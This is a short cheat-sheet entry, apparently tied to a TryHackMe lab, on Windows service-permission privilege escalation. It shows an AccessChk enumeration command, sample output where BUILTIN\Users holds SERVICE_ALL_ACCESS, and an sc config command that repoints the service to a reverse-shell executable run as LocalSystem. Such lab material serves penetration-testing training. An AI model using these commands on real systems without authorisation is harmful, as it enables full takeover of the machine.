---
description: |
  AccessChk is an tool from Sysinternals to gain information about the access control of a service. If the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. From the AccessChk output you must verify whether OWNER has higher permission than ACCESS_ALLOWED_ACE_TYPE, if you have control over ACCESS_ALLOWED_ACE_TYPE you can perform privesc by changing executable of service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself. This is shown in the extra code section.

  Command Reference:
  ```
  thmservice: Service to see the access control from
  ```
command: |
  .\accesschk.exe -qlc thmservice

code: |
  To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe, in PowerShell):
  sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

  C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

items:
  - Shell
OS:
  - Windows
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
---